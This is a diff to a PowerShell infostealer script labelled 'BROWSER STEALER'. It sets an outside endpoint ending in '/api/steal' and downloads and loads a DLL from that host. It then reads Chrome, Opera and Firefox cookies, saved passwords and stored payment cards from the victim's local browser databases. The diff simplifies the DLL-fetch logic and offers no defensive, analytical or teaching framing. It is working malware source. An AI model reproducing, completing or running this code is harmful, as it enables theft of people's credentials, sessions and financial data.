@@ -1,13 +1,11 @@
 # ============================================================
-# BROWSER STEALER — SIMPLE WORKING VERSION
-# Downloads SQLite DLL directly (no NuGet extraction)
+# BROWSER STEALER — USES YOUR HOSTED DLL
 # ============================================================
 
 $ErrorActionPreference = "Continue"
 $SERVER_URL = "https://cipheranon-production.up.railway.app/api/steal"
 $LOGFILE = "$env:TEMP\stealer_log.txt"
 
-# Clear log
 Remove-Item $LOGFILE -Force -ErrorAction SilentlyContinue
 
 function Write-Log {
@@ -26,84 +24,50 @@ Write-Log "============================================"
 Write-Log ""
 
 # ============================================================
-# DOWNLOAD SQLITE DLL DIRECTLY
+# DOWNLOAD YOUR HOSTED DLL
 # ============================================================
 
-$dllPath = "$env:TEMP\SQLite.dll"
+$dllPath = "$env:TEMP\System.Data.SQLite.dll"
 
-# Try to load from temp first
+# Clean up any corrupted DLL
 if (Test-Path $dllPath) {
-    Write-Log "[+] SQLite DLL found in temp"
-    try {
-        [System.Reflection.Assembly]::LoadFrom($dllPath) | Out-Null
-        Write-Log "[+] SQLite loaded from temp!"
-        $sqliteLoaded = $true
-    } catch {
-        Write-Log "[!] Failed to load from temp: $_"
-        Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
-        $sqliteLoaded = $false
-    }
-} else {
-    $sqliteLoaded = $false
+    Write-Log "[+] Removing old/corrupted DLL"
+    Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
 }
 
-# Download if not loaded
-if (-not $sqliteLoaded) {
-    Write-Log "[+] Downloading SQLite DLL..."
+Write-Log "[+] Downloading SQLite DLL from your server..."
+
+$dllUrl = "https://cipheranon-production.up.railway.app/System.Data.SQLite.dll"
+
+try {
+    $webClient = New-Object System.Net.WebClient
+    $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+    $webClient.DownloadFile($dllUrl, $dllPath)
     
-    # Try multiple reliable sources
-    $urls = @(
-        "https://raw.githubusercontent.com/ackara/System.Data.SQLite/master/System.Data.SQLite.dll",
-        "https://cipheranon-production.up.railway.app/System.Data.SQLite.dll"
-    )
-    
-    $downloaded = $false
-    foreach ($url in $urls) {
-        Write-Log "[+] Trying: $url"
-        try {
-            $webClient = New-Object System.Net.WebClient
-            $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
-            $webClient.DownloadFile($url, $dllPath)
-            
-            if (Test-Path $dllPath -and (Get-Item $dllPath).Length -gt 10000) {
-                Write-Log "[+] Downloaded: $((Get-Item $dllPath).Length) bytes"
-                [System.Reflection.Assembly]::LoadFrom($dllPath) | Out-Null
-                Write-Log "[+] SQLite loaded successfully!"
-                $downloaded = $true
-                $sqliteLoaded = $true
-                break
-            }
-        } catch {
-            Write-Log "[!] Failed: $_"
-        }
+    if (Test-Path $dllPath -and (Get-Item $dllPath).Length -gt 50000) {
+        Write-Log "[+] Downloaded: $((Get-Item $dllPath).Length) bytes"
+    } else {
+        Write-Log "[!] Downloaded file is too small or missing"
+        Write-Log "[!] Make sure you uploaded System.Data.SQLite.dll to your public folder"
+        Read-Host "Press Enter to exit"
+        exit
     }
-    
-    if (-not $downloaded) {
-        Write-Log "[!] Failed to download SQLite from all sources"
-    }
+} catch {
+    Write-Log "[!] Download failed: $_"
+    Write-Log "[!] Make sure you uploaded System.Data.SQLite.dll to your public folder"
+    Write-Log "[!] URL should be: $dllUrl"
+    Read-Host "Press Enter to exit"
+    exit
 }
 
-# ============================================================
-# FALLBACK: Try built-in SQLite
-# ============================================================
-
-if (-not $sqliteLoaded) {
-    Write-Log "[+] Trying Microsoft.Data.Sqlite..."
-    try {
-        Add-Type -AssemblyName "Microsoft.Data.Sqlite" -ErrorAction Stop
-        $sqliteLoaded = $true
-        $isMicrosoft = $true
-        Write-Log "[+] Microsoft.Data.Sqlite loaded!"
-    } catch {
-        Write-Log "[!] Microsoft.Data.Sqlite not available"
-        $isMicrosoft = $false
-    }
-}
-
-if (-not $sqliteLoaded) {
-    Write-Log "[!] No SQLite available"
-    Write-Log "[!] Check internet connection"
-    Write-Log "[!] Log saved to: $LOGFILE"
+# Load the DLL
+try {
+    [System.Reflection.Assembly]::LoadFrom($dllPath) | Out-Null
+    Write-Log "[+] SQLite loaded successfully!"
+    $sqliteLoaded = $true
+} catch {
+    Write-Log "[!] Failed to load DLL: $_"
+    Write-Log "[!] Make sure you uploaded the correct DLL (rename sqlite3.dll to System.Data.SQLite.dll)"
     Read-Host "Press Enter to exit"
     exit
 }
@@ -120,41 +84,22 @@ function Read-SQLite {
         $temp = "$env:TEMP\db_$([System.IO.Path]::GetRandomFileName()).tmp"
         Copy-Item $DbPath $temp -Force
         
-        if ($isMicrosoft) {
-            $conn = New-Object Microsoft.Data.Sqlite.SqliteConnection("Data Source=$temp")
-            $conn.Open()
-            $cmd = $conn.CreateCommand()
-            $cmd.CommandText = $Query
-            $rdr = $cmd.ExecuteReader()
-            while ($rdr.Read()) {
-                $row = @{}
-                for ($i=0; $i -lt $rdr.FieldCount; $i++) {
-                    $n = $rdr.GetName($i)
-                    $v = $rdr.GetValue($i)
-                    if ($v -ne $null) { $row[$n] = $v }
-                }
-                $result += $row
+        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp;Version=3;")
+        $conn.Open()
+        $cmd = $conn.CreateCommand()
+        $cmd.CommandText = $Query
+        $rdr = $cmd.ExecuteReader()
+        while ($rdr.Read()) {
+            $row = @{}
+            for ($i=0; $i -lt $rdr.FieldCount; $i++) {
+                $n = $rdr.GetName($i)
+                $v = $rdr.GetValue($i)
+                if ($v -ne $null) { $row[$n] = $v }
             }
-            $rdr.Close()
-            $conn.Close()
-        } else {
-            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp;Version=3;")
-            $conn.Open()
-            $cmd = $conn.CreateCommand()
-            $cmd.CommandText = $Query
-            $rdr = $cmd.ExecuteReader()
-            while ($rdr.Read()) {
-                $row = @{}
-                for ($i=0; $i -lt $rdr.FieldCount; $i++) {
-                    $n = $rdr.GetName($i)
-                    $v = $rdr.GetValue($i)
-                    if ($v -ne $null) { $row[$n] = $v }
-                }
-                $result += $row
-            }
-            $rdr.Close()
-            $conn.Close()
+            $result += $row
         }
+        $rdr.Close()
+        $conn.Close()
         Remove-Item $temp -Force -ErrorAction SilentlyContinue
     } catch {}
     return $result
@@ -283,7 +228,7 @@ $allCookies = @()
 $allPasswords = @()
 $allCards = @()
 
-# Cookies
+Write-Log ""
 Write-Log "[+] Chrome cookies..."
 $path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
 $allCookies += Get-BrowserCookies -Path $path -Name "Chrome"
@@ -303,7 +248,6 @@ $allCookies += Get-BrowserCookies -Path $path -Name "Opera"
 Write-Log "[+] Firefox cookies..."
 $allCookies += Get-FirefoxCookies
 
-# Passwords
 Write-Log "[+] Chrome passwords..."
 $path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
 $allPasswords += Get-BrowserPasswords -Path $path -Name "Chrome"
@@ -323,7 +267,6 @@ $allPasswords += Get-BrowserPasswords -Path $path -Name "Opera"
 Write-Log "[+] Firefox passwords..."
 $allPasswords += Get-FirefoxPasswords
 
-# Cards
 Write-Log "[+] Chrome cards..."
 $path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data"
 $allCards += Get-BrowserCards -Path $path -Name "Chrome"
